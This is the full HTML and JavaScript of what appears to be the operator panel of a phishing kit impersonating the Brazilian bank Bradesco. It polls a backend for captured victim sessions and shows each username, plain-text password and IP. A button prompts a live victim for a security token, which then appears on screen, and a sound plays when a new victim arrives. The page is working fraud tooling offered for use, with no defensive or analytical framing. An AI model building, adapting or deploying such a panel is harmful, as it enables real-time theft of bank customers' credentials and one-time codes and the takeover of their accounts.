<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Painel Admin Multi-Cliente - Bradesco</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .header { background: #cc092f; color: white; padding: 15px 20px; border-radius: 8px 8px 0 0; display: flex; justify-content: space-between; align-items: center; }
        .container { max-width: 1200px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f8f9fa; padding: 15px; text-align: left; border-bottom: 2px solid #dee2e6; color: #495057; }
        td { padding: 15px; border-bottom: 1px solid #dee2e6; vertical-align: middle; }
        tr:hover { background: #f1f3f5; }
        .badge { padding: 5px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .badge-online { background: #d4edda; color: #155724; }
        .badge-waiting { background: #fff3cd; color: #856404; }
        .btn { background: #cc092f; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px; }
        .btn:hover { background: #a50725; }
        .token-box { font-family: monospace; font-weight: bold; color: #cc092f; background: #fff5f5; padding: 5px 10px; border: 1px dashed #cc092f; border-radius: 4px; }
        .empty { padding: 40px; text-align: center; color: #6c757d; }
        .refresh-indicator { font-size: 12px; color: #eee; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>Painel de Controle Bradesco</h2>
            <div class="refresh-indicator">Atualizando automaticamente em <span id="timer">5</span>s</div>
        </div>
        
        <table id="table-acessos">
            <thead>
                <tr>
                    <th>Hora</th>
                    <th>Usuário</th>
                    <th>Senha</th>
                    <th>IP</th>
                    <th>Status</th>
                    <th>Token Recebido</th>
                    <th>Ações</th>
                </tr>
            </thead>
            <tbody id="lista-corpo">
                <!-- Preenchido via JS -->
            </tbody>
        </table>
        <div id="empty-msg" class="empty" style="display:none;">Nenhum acesso detectado no momento.</div>
    </div>

    <audio id="alert-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        let lastCount = 0;
        let timeLeft = 5;

        function atualizarPainel() {
            fetch('../token_api.php?action=listar_admin')
                .then(r => r.json())
                .then(data => {
                    const corpo = document.getElementById('lista-corpo');
                    const emptyMsg = document.getElementById('empty-msg');
                    
                    if (data.acessos.length === 0) {
                        corpo.innerHTML = '';
                        emptyMsg.style.display = 'block';
                        return;
                    }
                    
                    emptyMsg.style.display = 'none';
                    
                    // Alerta sonoro se houver novo acesso
                    if (data.acessos.length > lastCount) {
                        document.getElementById('alert-sound').play().catch(e => {});
                        lastCount = data.acessos.length;
                    }

                    let html = '';
                    data.acessos.reverse().forEach(a => {
                        const statusBadge = a.token_solicitado ? 
                            '<span class="badge badge-waiting">Aguardando Token</span>' : 
                            '<span class="badge badge-online">Online</span>';
                        
                        const tokenDisplay = a.token_recebido ? 
                            `<span class="token-box">${a.token_recebido}</span>` : 
                            '---';

                        html += `
                            <tr>
                                <td>${a.timestamp}</td>
                                <td><strong>${a.usuario}</strong></td>
                                <td><code>${a.senha}</code></td>
                                <td>${a.ip}</td>
                                <td>${statusBadge}</td>
                                <td>${tokenDisplay}</td>
                                <td>
                                    <button class="btn" onclick="solicitarToken('${a.id}')" ${a.token_solicitado ? 'disabled' : ''}>
                                        Solicitar Token
                                    </button>
                                </td>
                            </tr>
                        `;
                    });
                    corpo.innerHTML = html;
                });
        }

        function solicitarToken(id) {
            fetch(`../token_api.php?action=solicitar_token&session_id=${id}`)
                .then(r => r.json())
                .then(() => atualizarPainel());
        }

        // Timer de atualização
        setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                atualizarPainel();
                timeLeft = 5;
            }
            document.getElementById('timer').innerText = timeLeft;
        }, 1000);

        atualizarPainel();
    </script>
</body>
</html>
